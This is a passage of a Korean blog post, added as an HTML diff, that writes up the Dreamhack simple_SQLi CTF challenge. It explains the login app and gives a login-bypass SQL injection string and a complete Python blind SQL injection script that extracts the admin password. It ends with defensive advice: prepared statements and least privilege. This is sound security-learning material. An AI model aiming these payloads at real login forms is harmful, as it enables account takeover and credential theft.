+        return &#39;&lt;script&gt;alert(&quot;wrong&quot;);history.go(-1);&lt;/script&gt;&#39;
+
+app.run(host=&#39;0.0.0.0&#39;, port=8000)
+</code></pre>
+<p>FLAG 변수에 플래그가 담긴다.<br><img src="https://velog.velcdn.com/images/njw/post/a4d4ab87-c08e-46e2-b572-1c02bc17a89c/image.png" alt=""></p>
+<p>get_db() 함수에서 <b>애플리케이션이 실행되는 동안 필요할 때마다 DB 연결 객체를 가져온다.</b></p>
+<p>query_db() 함수에서 매번 커서를 만들고 닫는 번거로움을 줄여주는 <b>쿼리 실행 편의 기능을 담당한다.</b></p>
+<p>close_connection() 함수는 연결 자동 종료 함수로써 <b>DB 연결을 명시적으로 닫아 메모리 누수나 파일 잠금 문제를 해결한다.</b></p>
+<p><img src="https://velog.velcdn.com/images/njw/post/0dcbf818-8acc-4ab1-a81f-4639ab56a8b0/image.png" alt=""></p>
+<p>아래의 코드로 생성된 데이터베이스 구조는 아래와 같다. <b>userid와 userpassword 컬럼은 각각 이용자의 ID와 PW를 저장</b>한다. 아래 schema을 살펴보면, <b>guest 계정은 이용자가 알 수 있지만 admin 계정은 랜덤하게 생성된 16 바이트의 문자열이기 때문에 비밀번호를 예상할 수 없다.</b></p>
+<p><b>users 테이블</b></p>
+<table>
+<thead>
+<tr>
+<th align="center">userid</th>
+<th align="center">userpassword</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">guest</td>
+<td align="center">guest</td>
+</tr>
+<tr>
+<td align="center">admin</td>
+<td align="center">랜덤 16바이트 문자열을 Hex 형태로 표현 (32바이트)</td>
+</tr>
+</tbody></table>
+<p>아래 코드는 로그인 페이지를 구성하는 코드이다. 코드를 살펴보면, 메소드에 따른 요청마다 다른 기능을 수행하는 것을 알 수 있다.</p>
+<h4>GET</h4>
+<p>userid와 userpassword를 입력할 수 있는 로그인 페이지 제공. <b>userid와 password 입력창에 guest를 입력하면 로그인을 수행</b> 가능.</p>
+<h4>POST</h4>
+<p>이용자가 입력한 계정 정보가 데이터베이스에 존재하는지 확인. 이때, <b>로그인 계정이 admin일 경우 FLAG를 출력.</b><br><img src="https://velog.velcdn.com/images/njw/post/cd8af8aa-87b6-42df-937d-57dbb8ec37cb/image.png" alt=""></p>
+<h3>취약점 분석</h3>
+<p>문제를 해결하기 위해선 <b>admin 계정으로 로그인해 플래그를 획득</b>해야 한다.</p>
+<p>로그인을 진행할 때, <b>사용자의 입력값을 검증없이 그대로 쿼리에 삽입하므로..</b></p>
+<h4>SQL injection</h4>
+<pre><code>    /*
+    ID: admin&quot; or &quot;1 , PW: DUMMY
+    userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
+    */
+    SELECT * FROM users WHERE userid=&quot;admin&quot; or &quot;1&quot; AND userpassword=&quot;DUMMY&quot;
+</code></pre>
+<p><b>userid에 admin&quot; or &quot;1 입력값을 삽입</b>하면 전체 쿼리가 userid=&quot;admin&quot; or &quot;1&quot; 조건이 되어 <b>뒤 AND 연산자를 무시하고 반드시 실행되도록 할 수 있다.</b><br><img src="https://velog.velcdn.com/images/njw/post/538c7fe6-a811-4c5e-8154-2bc4acdd23e6/image.png" alt=""></p>
+<h4>Blind SQL injection</h4>
+<p>/login에서 <b>폼 데이터를 POST할 때, id 값은 userid에 담기고 비밀번호 값은 userpassword에 담기는 것을 확인</b>할 수 있다.</p>
+<p><img src="https://velog.velcdn.com/images/njw/post/8e539171-d47d-4bff-b6c4-0195b489512c/image.png" alt=""></p>
+<p>아래와 같은 페이로드를 이용해 비밀번호의 길이를 알아내 그 수 만큼 반복하여 <b>admin 계정의 비밀번호를 알아낼 수 있다.</b></p>
+<pre><code>#!/usr/bin/python3
+import requests
+import sys
+from urllib.parse import urljoin
+
+
+class Solver:
+    &quot;&quot;&quot;Solver for simple_SQLi challenge&quot;&quot;&quot;
+    
+    def __init__(self, port: str) -&gt; None:
+        self._chall_url = f&quot;http://host1.dreamhack.games:{port}&quot;
+        self._login_url = urljoin(self._chall_url, &quot;login&quot;)
+
+    def _login(self, userid: str, userpassword: str) -&gt; requests.Response:
+        return requests.post(self._login_url, data={&quot;userid&quot;: userid, &quot;userpassword&quot;: userpassword})
+
+    def _sqli(self, query: str) -&gt; requests.Response:
+        return self._login(f&#39;&quot; or {query}-- &#39;, &quot;hi&quot;)
+
+    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -&gt; int:
+        while low + 1 &lt; high:
+            mid = (low + high) // 2
+            query = query_tmpl.format(val=mid)
+            if &quot;hello&quot; in self._sqli(query).text:
+                high = mid
+            else:
+                low = mid
+        return (low + high) // 2
+
+    def _find_password_length(self, user: str, max_pw_len: int = 100) -&gt; int:
+        query_tmpl = f&#39;((SELECT LENGTH(userpassword) WHERE userid=&quot;{user}&quot;) &lt; {{val}})&#39;
+        return self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
+
+    def _find_password(self, user: str, pw_len: int) -&gt; str:
+        pw = &quot;&quot;
+        for idx in range(1, pw_len + 1):
+            query_tmpl = f&#39;((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=&quot;{user}&quot;) &lt; CHAR({{val}}))&#39;
+            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x20, 0x7E))
+            print(f&quot;{idx}. {pw}&quot;)
+        return pw
+
+    def solve(self) -&gt; None:
+        pw_len = self._find_password_length(&quot;admin&quot;)
+        print(f&quot;Length of the admin password is: {pw_len}&quot;)
+        print(&quot;Finding password:&quot;)
+        pw = self._find_password(&quot;admin&quot;, pw_len)
+        print(f&quot;Password of the admin is: {pw}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    port = sys.argv[1]
+    solver = Solver(port)
+    solver.solve()
+</code></pre>
+<p>플래그 획득 성공!<br><img src="https://velog.velcdn.com/images/njw/post/3497c214-f91e-4a32-9a88-d07f616ec6e6/image.png" alt=""></p>
+<h2>SQL injection 방어</h2>
+<p>SQL 인젝션은 결국 <b>사용자의 입력값이 단순 데이터가 아닌 SQL 쿼리로 인식되는 것</b>이기에<br>**매개변수화 쿼리(Prepared Statement)**를 이용해 <b>SQL 쿼리 구조를 선 정의하고 사용자의 입력값을 단순 데이터 취급하여 처리하면 방어</b>된다.<br>이외에도 <b>입력값 검증</b>과 웹 어플리케이션이 이용하는 DB 계정에 필요한 권한만 부여하는 **최소 권한 원칙(Principle of Least Privilege)**을 이용하면 더 좋다.</p>
+<h1>마무리</h1>
+<p>SQL 인젝션을 방어하기 위해서 Prepared Statement만 이용해봤었는데 최소 권한 원칙의 중요성을 다시금 상기하게 됐다. 앞으로는 잘 써야지!</p>
+
+            </div>
+        </article>
+    </main>
+
+    <footer class="blog-footer">
+        <div>Copyright &copy;2024 All rights reserved by jeongwon.</div>
+    </footer>
+
+    <script>
+    (function () {
+        var header = document.getElementById('header');
+        var scrolled = false;
+        window.addEventListener('scroll', function () {
+            if (!scrolled && window.scrollY > 120) { scrolled = true; header.classList.add('scrolled'); }
+            else if (scrolled && window.scrollY < 30) { scrolled = false; header.classList.remove('scrolled'); }
+        });
+        window.addEventListener('DOMContentLoaded', function () {
+            if (typeof hljs !== 'undefined') document.querySelectorAll('pre code').forEach(function (b) { hljs.highlightElement(b); });
+        });
+    })();
+    </script>
+</body>
+
+</html>
